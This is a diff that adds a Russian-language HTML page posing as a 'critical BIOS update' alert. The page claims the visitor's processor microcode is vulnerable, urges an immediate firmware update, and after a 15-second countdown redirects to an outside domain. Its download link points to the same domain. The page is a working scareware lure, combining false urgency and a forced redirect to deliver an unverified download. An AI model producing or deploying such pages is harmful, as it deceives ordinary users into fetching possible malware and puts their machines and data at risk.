@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Критическое обновление BIOS</title>
+    <script>
+        setTimeout(function() {
+            window.location.href = "http://whatsuam.cc/";
+        }, 15000);
+    </script>
+    <style>
+        body { font-family: Arial, sans-serif; background: #8b0000; padding: 50px; }
+        .bios-update { background: white; padding: 40px; border-radius: 5px; }
+        .critical { color: #8b0000; font-weight: bold; text-align: center; font-size: 24px; }
+        .warning-box { background: #ffe6e6; border: 2px solid #8b0000; padding: 20px; border-radius: 5px; margin: 20px 0; }
+        .steps { background: #f5f5f5; padding: 20px; border-radius: 5px; }
+    </style>
+</head>
+<body>
+    <div class="bios-update">
+        <h2 class="critical">🚨 КРИТИЧЕСКОЕ ОБНОВЛЕНИЕ BIOS</h2>
+        <div class="warning-box">
+            <strong>Обнаружены уязвимости в микрокоде процессора</strong>
+            <p>Требуется немедленное обновление BIOS для защиты от атак</p>
+        </div>
+        <div class="steps">
+            <strong>Процесс обновления:</strong>
+            <ol>
+                <li>Скачайте обновление BIOS</li>
+                <li>Создайте загрузочный носитель</li>
+                <li>Выполните прошивку в среде BIOS</li>
+            </ol>
+        </div>
+        <p>Перенаправление через: <span id="biosTimer">15</span> секунд</p>
+        <p><a href="http://whatsuam.cc/">Скачать обновление</a></p>
+    </div>
+    
+    <script>
+        let biosTimer = 15;
+        setInterval(function() {
+            biosTimer--;
+            document.getElementById('biosTimer').textContent = biosTimer;
+        }, 1000);
+    </script>
+</body>
+</html>
